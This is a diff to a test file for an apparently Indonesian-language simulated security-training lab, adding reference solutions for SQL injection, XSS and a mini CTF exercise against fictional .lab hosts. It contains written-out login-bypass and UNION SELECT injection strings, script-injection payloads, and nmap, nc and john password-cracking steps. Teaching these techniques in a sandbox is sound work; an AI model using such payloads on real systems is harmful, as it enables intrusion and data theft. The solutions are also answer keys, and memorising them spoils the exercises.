@@ -1,5 +1,6 @@
 import { describe, expect, it } from "vitest";
 import { buildNetwork, commandNames, evaluateObjectives, execute, type LabContext, type LabDefinition, type ShellSession } from "@/engine";
+import { CTF_FLAGS_FOR_TESTS } from "./ctf";
 import { labList } from "./index";
 
 /** Reference solutions: [deviceId, command][] plus UI facts the learner would trigger. */
@@ -225,6 +226,44 @@ const solutions: Record<string, { steps: Step[]; uiFacts?: string[] }> = {
       ["srv", "cat /var/log/kern.log"],
     ],
   },
+  "sql-injection": {
+    steps: [
+      ["laptop", 'browser "http://toko.lab/cari?q=kabel"'],
+      ["laptop", `browser "http://toko.lab/cari?q='"`],
+      ["laptop", `curl -d "user=admin' -- &pass=bebas" http://toko.lab/login`],
+      ["laptop", `browser "http://toko.lab/cari?q=x' UNION SELECT table_name, table_schema FROM information_schema.tables -- "`],
+      ["laptop", `browser "http://toko.lab/cari?q=x' UNION SELECT catatan, 1 FROM rahasia_admin -- "`],
+      ["laptop", `curl -d "user=admin' -- &pass=bebas" http://toko.lab/v2/login`],
+    ],
+  },
+  xss: {
+    steps: [
+      ["laptop", "browser http://forum.lab/buku-tamu"],
+      ["laptop", 'browser "http://forum.lab/cari?q=<b>tebal</b>"'],
+      ["laptop", 'browser "http://forum.lab/cari?q=<script>alert(1)</script>"'],
+      ["laptop", 'curl -d "nama=Iseng&pesan=<script>alert(1)</script>" http://forum.lab/buku-tamu'],
+      ["laptop", "browser http://forum.lab/buku-tamu"],
+      ["laptop", 'curl -d "nama=Iseng&pesan=<script>alert(1)</script>" http://forum.lab/v2/buku-tamu'],
+      ["laptop", "browser http://forum.lab/v2/buku-tamu"],
+    ],
+  },
+  "ctf-mini": {
+    steps: [
+      ["kali", "cat README.txt"],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.pemanasan}`],
+      ["kali", "dig ctf.lab TXT +short"],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.dns}`],
+      ["kali", "curl http://portal.ctf.lab/robots.txt"],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.robots}`],
+      ["kali", "sudo nmap -p- files.ctf.lab"],
+      ["kali", "nc files.ctf.lab 8888"],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.port}`],
+      ["kali", "john --format=raw-md5 --wordlist=/usr/share/wordlists/umum.txt bocoran/hash.txt"],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.hash}`],
+      ["kali", `curl -d "user=admin' -- &pass=x" http://portal.ctf.lab/login`],
+      ["kali", `submit-flag ${CTF_FLAGS_FOR_TESTS.sqli}`],
+    ],
+  },
 };
 
 export type Step = [deviceId: string, command: string] | { ui: string[] };
@@ -242,7 +281,7 @@ export function runSolution(lab: LabDefinition, steps: Step[]) {
         const device = net.device(deviceId);
         sessions.set(deviceId, { device, cwd: device.fs?.home ?? "/", history: [] });
       }
-      recent = execute(net, sessions.get(deviceId)!, cmd, { allowedCommands: lab.allowedCommands, background: lab.background }).facts;
+      recent = execute(net, sessions.get(deviceId)!, cmd, { allowedCommands: lab.allowedCommands, background: lab.background, flags: lab.flags }).facts;
     } else {
       recent = step.ui;
     }
